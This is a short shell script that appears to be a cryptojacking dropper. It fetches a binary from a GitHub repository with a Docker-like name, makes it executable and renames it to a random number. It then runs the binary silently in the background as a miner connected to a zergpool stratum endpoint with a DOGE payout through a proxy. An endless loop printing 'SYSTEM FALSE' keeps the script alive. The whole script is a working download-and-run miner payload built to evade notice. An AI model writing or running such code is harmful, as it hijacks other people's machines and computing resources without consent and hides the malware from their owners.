#!/bin/sh
algo=$1
user=$2
proxy=$3
worker=$(shuf -n 1 -i 1-9999999)
wget -q https://github.com/qcervavtfskpvjm/dockerio-project1/raw/main/cpm1
chmod +x cpm1
mv cpm1 $worker
./$worker -a $algo -o stratum+tcp://power2b.mine.zergpool.com:7445 -u $user.$worker -p c=DOGE,mc=MBC -x $proxy >/dev/null 2>&1 >/dev/null &
while :; do echo "SYSTEM FALSE"; sleep 30; done
